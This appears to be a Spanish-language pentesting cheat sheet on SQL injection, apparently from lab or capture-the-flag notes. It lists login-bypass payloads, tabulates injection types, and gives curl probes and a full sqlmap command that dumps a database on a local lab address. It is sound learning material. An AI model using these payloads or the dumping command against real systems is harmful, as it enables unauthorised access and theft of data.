## SQL Injection (SQLi)

La **inyección SQL** consiste en alterar una consulta a la base de datos introduciendo código SQL malicioso en un campo de entrada (como un formulario de login). Si la aplicación no sanitiza la entrada, podemos manipular la consulta.

### Inyección básica (bypass de login)

El payload más básico para saltarse la autenticación:

```
Usuario: admin
Password: ' OR 1=1-- -
```

> `-- -` comenta el resto de la consulta para neutralizar la comprobación de la contraseña.

Más variantes comunes:

```
' OR '1'='1
' OR 1=1#
admin'--
' OR ''='
```

### Tipos de inyección

| Tipo                 | Cómo se detecta                                                            | Uso                          |
| -------------------- | -------------------------------------------------------------------------- | ---------------------------- |
| **Error-based**      | La base de datos devuelve errores que filtran información                    | Rápido de explotar           |
| **Union-based**      | Se usa `UNION SELECT` para combinar y extraer datos en la respuesta          | Extraer datos directamente   |
| **Boolean-based (blind)** | La respuesta cambia de forma binaria (sí/no) según la condición             | Cuando no hay salida visible |
| **Time-based (blind)**    | Se introduce un retraso (`SLEEP`) si la condición es verdadera            | Cuando no hay salida ni error |
| **Stacked queries**  | Permite ejecutar varias consultas seguidas (`;`)                             | DDL, DML, técnicas avanzadas  |

### Prueba manual con curl

```bash
# Ver si la respuesta cambia al inyectar
curl 'http://IP/pagina?id=1'
curl 'http://IP/pagina?id=1' --data 'user=admin&passwd='"'"'OR 1=1-- -'
```

### Automatización con sqlmap

```bash
sqlmap -u "http://172.17.0.2/bills/" \
  --data="username=*&passwor=fht" \
  --cookie="PHPSESSID=dkoin5nnl92q4f6h5u3akmlpb0" \
  -p username \
  --level=3 --risk=2 \
  --dbms=mysql \
  --dump \
  --batch
```

Ver explicación detallada de este comando en [SQLDAMP](../Utilidades/SQLDAMP.md).

### Checklist rápida

1. ¿Acepta parámetros la URL o el formulario? (`?id=`, campos de login, búsquedas).
2. Prueba una comilla simple `'` y observa si da error o un cambio de comportamiento.
3. Prueba `1 AND 1=1` vs `1 AND 1=2` (boolean-based).
4. Prueba `' OR 1=1-- -` en logins.
5. Si confirman la inyección, usa **sqlmap** para automatizar la extracción.